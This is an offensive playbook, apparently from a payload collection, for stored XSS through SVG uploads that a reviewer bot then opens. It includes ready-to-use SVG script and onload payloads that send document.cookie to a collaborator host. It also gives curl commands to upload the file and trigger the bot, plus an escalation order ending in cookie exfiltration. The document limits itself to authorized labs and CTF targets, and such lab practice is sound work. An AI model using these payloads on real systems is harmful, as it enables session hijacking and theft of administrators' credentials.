# SVG Upload XSS For Curator/Review Bots

## Context

Use when an application:

- accepts image uploads
- serves them back from `/uploads/...` or similar
- provides a curator/admin/reviewer trigger such as `/api/send`

## Requirements

- Authorized lab, owned app, in-scope target, or defensive review.
- Do not store live secrets, tokens, cookies, flags, or private URLs in reusable files.

## Minimal SVG Payload

```xml
<svg xmlns="http://www.w3.org/2000/svg">
<script><![CDATA[
fetch('https://[collaborator]?c='+encodeURIComponent(document.cookie));
]]></script>
</svg>
```

Event-handler variant:

```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('https://[collaborator]?c='+encodeURIComponent(document.cookie))"></svg>
```

## Upload

```bash
curl -sS -X POST "https://[host]/api/upload" \
  -F "file=@xss.svg;filename=xss.svg;type=image/svg+xml"
```

Expected response shape:

```json
{
  "hash": "...",
  "url": "/uploads/[hash].svg"
}
```

## Verify Stored Object

```bash
curl -i "https://[host]/uploads/[hash].svg"
```

Useful signals:

```http
Content-Type: image/svg+xml
```

Body still contains `<script>` or event handler.

## Trigger Reviewer Bot

```bash
curl -sS -X POST "https://[host]/api/send" \
  -H "Content-Type: application/json" \
  -d '{"hash":"[hash]"}'
```

Alternate endpoint names to try:

```text
/api/report
/api/review
/api/visit
```

## Expected Collaborator Signal

```text
?c=FLAG=pwnbox{...}
?c=session=...
```

## Why This Works

SVG is XML. If the app stores and serves it from the first-party origin without sanitization, embedded script can run when the reviewer opens the file directly.

## Common Mistakes

- Spending time on PNG polyglot override before testing `.svg`.
- Assuming `image/svg+xml` is safe because it is an image type.
- Uploading successfully but never triggering the reviewer bot endpoint.
- Using alert-only proof when the lab requires cookie exfil from a bot session.

## Escalation Order

1. Test `.svg` with inline script
2. If sanitized, test malformed / unclosed `.svg` for parser-failure storage
3. Trigger reviewer bot on uploaded hash
4. Exfiltrate `document.cookie`
5. If SVG blocked, test PNG polyglot
6. If object storage clues exist, test `?response-content-type=text/html`

## Related Pattern

If well-formed SVG is sanitized, switch to:

```text
payloads/xss/malformed-svg-parser-failure-upload.md
notes/upload-parser-failure-svg-left-alone.md
```

If SVG fails but PNG uploads work and responses include S3-style headers, switch to:

```text
payloads/xss/png-s3-response-content-type-xss.md
notes/s3-minio-response-header-override-xss.md
```
